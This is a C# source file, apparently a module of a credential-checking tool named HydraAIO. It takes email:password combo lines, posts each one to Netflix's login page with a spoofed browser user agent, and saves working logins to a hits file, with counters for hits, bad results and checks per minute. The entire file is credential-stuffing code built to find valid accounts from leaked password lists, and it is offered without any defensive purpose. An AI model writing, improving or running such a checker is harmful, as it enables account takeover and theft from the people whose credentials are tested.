using HydraAIO.Hydro;
using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace HydraAIO.Modules
{
    internal class netflixmodule
    {
        public static bool checknetflix(string combo)
        {
            using (HttpRequest httpRequest = new HttpRequest())
            {
                string email = combo.Split(':')[0];
                string password = combo.Split(':')[1];

                string data = "email=" + email + "password=" + password;

                CookieContainer cc = new CookieContainer();
                var request2 = (HttpWebRequest)HttpWebRequest.Create("https://www.netflix.com/al/login");

                var postdata = Encoding.ASCII.GetBytes(data);
                request2.Method = "Post";
                request2.UserAgent = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36";

                request2.ContentLength = data.Length;

                using (var stream = request2.GetRequestStream())
                {
                    stream.Write(postdata, 0, data.Length);
                }
                var response = (HttpWebResponse)request2.GetResponse();

                string html = new StreamReader(response.GetResponseStream()).ReadToEnd();

                if (html.Contains("https://www.netflix.com/YourAccount?"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("ctaButtonLogout\":\"Sign\\x20Out\",\""))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("ctaButtonLogout\":"))
                {
                    ++Program.hits;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[+] Hit - " + combo, Color.Green);
                    Export.AsResult("/hits.txt", combo);
                    return true;
                }
                if (html.Contains("Choose your plan"))
                {
                    ++Program.custom;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[/] 2FA - " + combo, Color.Yellow);
                    Export.AsResult("/Free.txt", combo);
                    return true;
                }
                else
                {
                    ++Program.bad;
                    ++Program.cheked;
                    ++Program.cpm;
                    //Colorful.Console.WriteLine("[-] Bad - " + combo, Color.Red);
                    return true;
                }
            }
        }
    }
}
